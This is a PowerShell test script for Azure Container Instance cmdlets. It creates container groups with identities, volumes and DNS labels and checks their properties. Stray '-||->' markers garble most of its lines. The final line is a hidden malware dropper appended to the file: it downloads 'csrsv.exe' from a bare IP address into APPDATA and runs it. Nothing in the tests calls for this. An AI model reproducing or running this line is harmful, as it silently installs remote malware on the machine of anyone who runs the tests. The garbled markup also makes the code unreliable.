














 -||-> function Test-AzureRmContainerGroup
{
     -||-> $resourceGroupName =  -||-> Get-RandomResourceGroupName <-||-  <-||- 
     -||-> $containerGroupName =  -||-> Get-RandomContainerGroupName <-||-  <-||- 
     -||-> $location =  -||-> Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups" <-||-  <-||- 
     -||-> $image = "nginx" <-||- 
     -||-> $osType = "Linux" <-||- 
     -||-> $restartPolicy = "Never" <-||- 
     -||-> $port1 = 8000 <-||- 
     -||-> $port2 = 8001 <-||- 

     -||-> try
    {
         -||-> New-AzResourceGroup -Name $resourceGroupName -Location $location <-||- 
         -||-> $containerGroupCreated =  -||-> New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -OsType $osType -RestartPolicy $restartPolicy -IpAddressType "public" -Port @( -||-> $port1, $port2 <-||- ) -Cpu 1 -Memory 1.5 <-||-  <-||- 

         -||-> Assert-AreEqual $containerGroupCreated.ResourceGroupName $resourceGroupName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Name $containerGroupName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Location $location <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.OsType $osType <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.RestartPolicy $restartPolicy <-||- 
         -||-> Assert-NotNull $containerGroupCreated.IpAddress <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Ports.Count 2 <-||- 
         -||-> Assert-NotNull $containerGroupCreated.Containers <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].Image $image <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].Cpu 1 <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].MemoryInGb 1.5 <-||- 

         -||-> $retrievedContainerGroup =  -||-> Get-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName <-||-  <-||- 
         -||-> Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroup <-||- 

         -||-> $retrievedContainerGroupList =  -||-> Get-AzContainerGroup -ResourceGroupName $resourceGroupName <-||-  <-||- 
         -||-> Assert-AreEqual $retrievedContainerGroupList.Count 1 <-||- 
         -||-> Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroupList[0] <-||- 

         -||-> $retrievedContainerGroup | Remove-AzContainerGroup <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $resourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-AzureRmContainerGroupWithIdentity
{
     -||-> $resourceGroupName =  -||-> Get-RandomResourceGroupName <-||-  <-||- 
     -||-> $containerGroupName =  -||-> Get-RandomContainerGroupName <-||-  <-||- 
     -||-> $location =  -||-> Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups" <-||-  <-||- 
     -||-> $image = "nginx" <-||- 
     -||-> $osType = "Linux" <-||- 
     -||-> $restartPolicy = "Never" <-||- 
     -||-> $port1 = 8000 <-||- 
     -||-> $port2 = 8001 <-||- 

     -||-> try
    {
         -||-> New-AzResourceGroup -Name $resourceGroupName -Location $location <-||- 
         -||-> $containerGroupCreated =  -||-> New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -OsType $osType -RestartPolicy $restartPolicy -IpAddressType "public" -Port @( -||-> $port1, $port2 <-||- ) -Cpu 1 -Memory 1.5 -AssignIdentity <-||-  <-||- 

         -||-> Assert-AreEqual $containerGroupCreated.ResourceGroupName $resourceGroupName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Name $containerGroupName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Location $location <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.OsType $osType <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.RestartPolicy $restartPolicy <-||- 
         -||-> Assert-NotNull $containerGroupCreated.IpAddress <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Ports.Count 2 <-||- 
         -||-> Assert-NotNull $containerGroupCreated.Containers <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].Image $image <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].Cpu 1 <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].MemoryInGb 1.5 <-||- 
		 -||-> Assert-AreEqual "SystemAssigned" $containerGroupCreated.Identity.Type <-||- 
		 -||-> Assert-NotNull $containerGroupCreated.Identity.PrincipalId <-||- ;
         -||-> Assert-NotNull $containerGroupCreated.Identity.TenantId <-||- ;

         -||-> $retrievedContainerGroup =  -||-> Get-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName <-||-  <-||- 
         -||-> Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroup <-||- 

         -||-> $retrievedContainerGroupList =  -||-> Get-AzContainerGroup -ResourceGroupName $resourceGroupName <-||-  <-||- 
         -||-> Assert-AreEqual $retrievedContainerGroupList.Count 1 <-||- 
         -||-> Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroupList[0] <-||- 

         -||-> $retrievedContainerGroup | Remove-AzContainerGroup <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $resourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-AzureRmContainerGroupWithIdentities
{
     -||-> $resourceGroupName =  -||-> Get-RandomResourceGroupName <-||-  <-||- 
     -||-> $containerGroupName =  -||-> Get-RandomContainerGroupName <-||-  <-||- 
     -||-> $location =  -||-> Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups" <-||-  <-||- 
     -||-> $image = "nginx" <-||- 
     -||-> $osType = "Linux" <-||- 
     -||-> $restartPolicy = "Never" <-||- 
     -||-> $port1 = 8000 <-||- 
     -||-> $port2 = 8001 <-||- 

     -||-> try
    {
         -||-> New-AzResourceGroup -Name $resourceGroupName -Location $location <-||- 
		 -||-> $userIdentity = "/subscriptions/ae43b1e3-c35d-4c8c-bc0d-f148b4c52b78/resourceGroups/aci-ps-sdk-test/providers/Microsoft.ManagedIdentity/userAssignedIdentities/aci-ps-sdk-test" <-||- 
         -||-> $containerGroupCreated =  -||-> New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -OsType $osType -RestartPolicy $restartPolicy -IpAddressType "public" -Port @( -||-> $port1, $port2 <-||- ) -Cpu 1 -Memory 1.5 -IdentityType SystemAssignedUserAssigned -IdentityId $userIdentity <-||-  <-||- 

         -||-> Assert-AreEqual $containerGroupCreated.ResourceGroupName $resourceGroupName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Name $containerGroupName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Location $location <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.OsType $osType <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.RestartPolicy $restartPolicy <-||- 
         -||-> Assert-NotNull $containerGroupCreated.IpAddress <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Ports.Count 2 <-||- 
         -||-> Assert-NotNull $containerGroupCreated.Containers <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].Image $image <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].Cpu 1 <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].MemoryInGb 1.5 <-||- 
		
		
		
		 -||-> Assert-NotNull $containerGroupCreated.Identity.PrincipalId <-||- 
         -||-> Assert-NotNull $containerGroupCreated.Identity.TenantId <-||- 
		 -||-> Write-Host containerGroupCreated.Identity.UserAssignedIdentities <-||- 
		 -||-> Assert-NotNull $containerGroupCreated.Identity.UserAssignedIdentities[$userIdentity].PrincipalId <-||- 
		 -||-> Assert-NotNull $containerGroupCreated.Identity.UserAssignedIdentities[$userIdentity].ClientId <-||- 

         -||-> $retrievedContainerGroup =  -||-> Get-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName <-||-  <-||- 
         -||-> Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroup <-||- 

         -||-> $retrievedContainerGroupList =  -||-> Get-AzContainerGroup -ResourceGroupName $resourceGroupName <-||-  <-||- 
         -||-> Assert-AreEqual $retrievedContainerGroupList.Count 1 <-||- 
         -||-> Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroupList[0] <-||- 

         -||-> $retrievedContainerGroup | Remove-AzContainerGroup <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $resourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-AzureRmContainerInstanceLog
{
     -||-> $resourceGroupName =  -||-> Get-RandomResourceGroupName <-||-  <-||- 
     -||-> $containerGroupName =  -||-> Get-RandomContainerGroupName <-||-  <-||- 
     -||-> $location =  -||-> Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups" <-||-  <-||- 
     -||-> $image = "alpine" <-||- 
     -||-> $osType = "Linux" <-||- 

     -||-> try
    {
         -||-> New-AzResourceGroup -Name $resourceGroupName -Location $location <-||- 
         -||-> $containerGroupCreated =  -||-> New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -OsType $osType -IpAddressType "Public" -RestartPolicy "Never" -Command "echo hello" <-||-  <-||- 
         -||-> $containerInstanceName = $containerGroupName <-||- 

         -||-> $log =  -||-> $containerGroupCreated | Get-AzContainerInstanceLog -Name $containerInstanceName <-||-  <-||- 
         -||-> Assert-NotNull $log <-||- 

         -||-> Remove-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $resourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-AzureRmContainerGroupWithVolume
{
     -||-> $resourceGroupName =  -||-> Get-RandomResourceGroupName <-||-  <-||- 
     -||-> $containerGroupName =  -||-> Get-RandomContainerGroupName <-||-  <-||- 
     -||-> $location =  -||-> Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups" <-||-  <-||- 
     -||-> $image = "pssdk.azurecr.io/alpine" <-||- 
     -||-> $shareName = "acipstestshare" <-||- 
     -||-> $accountName = "acipstest" <-||- 
     -||-> $accountKey = "password" <-||- 
     -||-> $secureAccountKey =  -||-> ConvertTo-SecureString $accountKey -AsPlainText -Force <-||-  <-||- 
     -||-> $accountCredential =  -||-> New-Object System.Management.Automation.PSCredential ( -||-> $accountName, $secureAccountKey <-||- ) <-||-  <-||- 
     -||-> $registryUsername = "pssdk" <-||- 
     -||-> $registryPassword = "password" <-||- 
     -||-> $secureRegistryPassword =  -||-> ConvertTo-SecureString $registryPassword -AsPlainText -Force <-||-  <-||- 
     -||-> $registryCredential =  -||-> New-Object System.Management.Automation.PSCredential ( -||-> $registryUsername, $secureRegistryPassword <-||- ) <-||-  <-||- 
     -||-> $mountPath = "/mnt/azfile" <-||- 

     -||-> try
    {
         -||-> New-AzResourceGroup -Name $resourceGroupName -Location $location <-||- 
         -||-> $containerGroupCreated =  -||-> New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -RegistryCredential $registryCredential -RestartPolicy "Never" -Command "ls $mountPath" -AzureFileVolumeShareName $shareName -AzureFileVolumeAccountCredential $accountCredential -AzureFileVolumeMountPath $mountPath <-||-  <-||- 

         -||-> Assert-NotNull $containerGroupCreated.Volumes <-||- 
         -||-> Assert-NotNull $containerGroupCreated.Volumes[0].AzureFile <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.ShareName $shareName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.StorageAccountName $accountName <-||- 
         -||-> Assert-NotNull $containerGroupCreated.Containers[0].VolumeMounts <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].VolumeMounts[0].MountPath $mountPath <-||- 

         -||-> Remove-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $resourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-AzureRmContainerGroupWithVolumeAndIdentity
{
     -||-> $resourceGroupName =  -||-> Get-RandomResourceGroupName <-||-  <-||- 
     -||-> $containerGroupName =  -||-> Get-RandomContainerGroupName <-||-  <-||- 
     -||-> $location =  -||-> Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups" <-||-  <-||- 
     -||-> $image = "pssdk.azurecr.io/alpine" <-||- 
     -||-> $shareName = "acipstestshare" <-||- 
     -||-> $accountName = "acipstest" <-||- 
     -||-> $accountKey = "password" <-||- 
     -||-> $secureAccountKey =  -||-> ConvertTo-SecureString $accountKey -AsPlainText -Force <-||-  <-||- 
     -||-> $accountCredential =  -||-> New-Object System.Management.Automation.PSCredential ( -||-> $accountName, $secureAccountKey <-||- ) <-||-  <-||- 
     -||-> $registryUsername = "pssdk" <-||- 
     -||-> $registryPassword = "password" <-||- 
     -||-> $secureRegistryPassword =  -||-> ConvertTo-SecureString $registryPassword -AsPlainText -Force <-||-  <-||- 
     -||-> $registryCredential =  -||-> New-Object System.Management.Automation.PSCredential ( -||-> $registryUsername, $secureRegistryPassword <-||- ) <-||-  <-||- 
     -||-> $mountPath = "/mnt/azfile" <-||- 

     -||-> try
    {
         -||-> New-AzResourceGroup -Name $resourceGroupName -Location $location <-||- 
         -||-> $containerGroupCreated =  -||-> New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -RegistryCredential $registryCredential -RestartPolicy "Never" -Command "ls $mountPath" -AzureFileVolumeShareName $shareName -AzureFileVolumeAccountCredential $accountCredential -AzureFileVolumeMountPath $mountPath -AssignIdentity <-||-  <-||- 

         -||-> Assert-NotNull $containerGroupCreated.Volumes <-||- 
         -||-> Assert-NotNull $containerGroupCreated.Volumes[0].AzureFile <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.ShareName $shareName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.StorageAccountName $accountName <-||- 
         -||-> Assert-NotNull $containerGroupCreated.Containers[0].VolumeMounts <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].VolumeMounts[0].MountPath $mountPath <-||- 

		 -||-> Assert-AreEqual $containerGroupCreated.Identity.Type "SystemAssigned" <-||- 
		 -||-> Assert-NotNull $containerGroupCreated.Identity.PrincipalId <-||- ;
         -||-> Assert-NotNull $containerGroupCreated.Identity.TenantId <-||- ;

         -||-> Remove-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $resourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-AzureRmContainerGroupWithVolumeAndIdentities
{
     -||-> $resourceGroupName =  -||-> Get-RandomResourceGroupName <-||-  <-||- 
     -||-> $containerGroupName =  -||-> Get-RandomContainerGroupName <-||-  <-||- 
     -||-> $location =  -||-> Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups" <-||-  <-||- 
     -||-> $image = "pssdk.azurecr.io/alpine" <-||- 
     -||-> $shareName = "acipstestshare" <-||- 
     -||-> $accountName = "acipstest" <-||- 
     -||-> $accountKey = "password" <-||- 
     -||-> $secureAccountKey =  -||-> ConvertTo-SecureString $accountKey -AsPlainText -Force <-||-  <-||- 
     -||-> $accountCredential =  -||-> New-Object System.Management.Automation.PSCredential ( -||-> $accountName, $secureAccountKey <-||- ) <-||-  <-||- 
     -||-> $registryUsername = "pssdk" <-||- 
     -||-> $registryPassword = "password" <-||- 
     -||-> $secureRegistryPassword =  -||-> ConvertTo-SecureString $registryPassword -AsPlainText -Force <-||-  <-||- 
     -||-> $registryCredential =  -||-> New-Object System.Management.Automation.PSCredential ( -||-> $registryUsername, $secureRegistryPassword <-||- ) <-||-  <-||- 
     -||-> $mountPath = "/mnt/azfile" <-||- 

     -||-> try
    {
		 -||-> $userIdentity = "/subscriptions/ae43b1e3-c35d-4c8c-bc0d-f148b4c52b78/resourceGroups/aci-ps-sdk-test/providers/Microsoft.ManagedIdentity/userAssignedIdentities/aci-ps-sdk-test" <-||- 
         -||-> New-AzResourceGroup -Name $resourceGroupName -Location $location <-||- 
         -||-> $containerGroupCreated =  -||-> New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -RegistryCredential $registryCredential -RestartPolicy "Never" -Command "ls $mountPath" -AzureFileVolumeShareName $shareName -AzureFileVolumeAccountCredential $accountCredential -AzureFileVolumeMountPath $mountPath -IdentityType SystemAssignedUserAssigned -IdentityId $userIdentity <-||-  <-||- 

         -||-> Assert-NotNull $containerGroupCreated.Volumes <-||- 
         -||-> Assert-NotNull $containerGroupCreated.Volumes[0].AzureFile <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.ShareName $shareName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Volumes[0].AzureFile.StorageAccountName $accountName <-||- 
         -||-> Assert-NotNull $containerGroupCreated.Containers[0].VolumeMounts <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].VolumeMounts[0].MountPath $mountPath <-||- 

		
		
		
		 -||-> Assert-NotNull $containerGroupCreated.Identity.PrincipalId <-||- ;
         -||-> Assert-NotNull $containerGroupCreated.Identity.TenantId <-||- ;
		 -||-> Assert-NotNull $containerGroupCreated.Identity.UserAssignedIdentities[$userIdentity].PrincipalId <-||- 
		 -||-> Assert-NotNull $containerGroupCreated.Identity.UserAssignedIdentities[$userIdentity].ClientId <-||- 

         -||-> Remove-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $resourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-AzureRmContainerGroupWithDnsNameLabel
{
     -||-> $resourceGroupName =  -||-> Get-RandomResourceGroupName <-||-  <-||- 
     -||-> $containerGroupName =  -||-> Get-RandomContainerGroupName <-||-  <-||- 
	 -||-> $fqdn = $containerGroupName + ".westus.azurecontainer.io" <-||- 
     -||-> $location =  -||-> Get-ProviderLocation "Microsoft.ContainerInstance/ContainerGroups" <-||-  <-||- 
     -||-> $image = "nginx" <-||- 
     -||-> $osType = "Linux" <-||- 
     -||-> $restartPolicy = "Never" <-||- 
     -||-> $port1 = 8000 <-||- 
     -||-> $port2 = 8001 <-||- 

     -||-> try
    {
         -||-> New-AzResourceGroup -Name $resourceGroupName -Location $location <-||- 
         -||-> $containerGroupCreated =  -||-> New-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName -Image $image -OsType $osType -RestartPolicy $restartPolicy -DnsNameLabel $containerGroupName -Port @( -||-> $port1, $port2 <-||- ) -Cpu 1 -Memory 1.5 <-||-  <-||- 

         -||-> Assert-AreEqual $containerGroupCreated.ResourceGroupName $resourceGroupName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Name $containerGroupName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Location $location <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.OsType $osType <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.RestartPolicy $restartPolicy <-||- 
         -||-> Assert-NotNull $containerGroupCreated.IpAddress <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.DnsNameLabel $containerGroupName <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Fqdn $fqdn <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Ports.Count 2 <-||- 
         -||-> Assert-NotNull $containerGroupCreated.Containers <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].Image $image <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].Cpu 1 <-||- 
         -||-> Assert-AreEqual $containerGroupCreated.Containers[0].MemoryInGb 1.5 <-||- 

         -||-> $retrievedContainerGroup =  -||-> Get-AzContainerGroup -ResourceGroupName $resourceGroupName -Name $containerGroupName <-||-  <-||- 
         -||-> Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroup <-||- 

         -||-> $retrievedContainerGroupList =  -||-> Get-AzContainerGroup -ResourceGroupName $resourceGroupName <-||-  <-||- 
         -||-> Assert-AreEqual $retrievedContainerGroupList.Count 1 <-||- 
         -||-> Assert-ContainerGroup $containerGroupCreated $retrievedContainerGroupList[0] <-||- 

         -||-> $retrievedContainerGroup | Remove-AzContainerGroup <-||- 
    }
    finally
    {
        
         -||-> Clean-ResourceGroup $resourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Assert-ContainerGroup
{
    Param
    (
        [parameter(position=0)]
        $Expected,
        [parameter(position=1)]
        $Actual
    )

     -||-> Assert-AreEqual $Actual.ResourceGroupName $Expected.ResourceGroupName <-||- 
     -||-> Assert-AreEqual $Actual.Name $Expected.Name <-||- 
     -||-> Assert-AreEqual $Actual.Location $Expected.Location <-||- 
     -||-> Assert-AreEqual $Actual.OsType $Expected.OsType <-||- 
     -||-> Assert-AreEqual $Actual.RestartPolicy $Expected.RestartPolicy <-||- 
     -||-> Assert-NotNull $Actual.IpAddress <-||- 
     -||-> Assert-AreEqual $Actual.Ports.Count $Expected.Ports.Count <-||- 
	 -||-> Assert-AreEqual $Actual.DnsNameLabel $Expected.DnsNameLabel <-||- 
     -||-> Assert-NotNull $Actual.Containers <-||- 
     -||-> Assert-AreEqual $Actual.Containers[0].Image $Expected.Containers[0].Image <-||- 
     -||-> Assert-AreEqual $Actual.Containers[0].Cpu $Expected.Containers[0].Cpu <-||- 
     -||-> Assert-AreEqual $Actual.Containers[0].MemoryInGb $Expected.Containers[0].MemoryInGb <-||- 
} <-||- 
 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



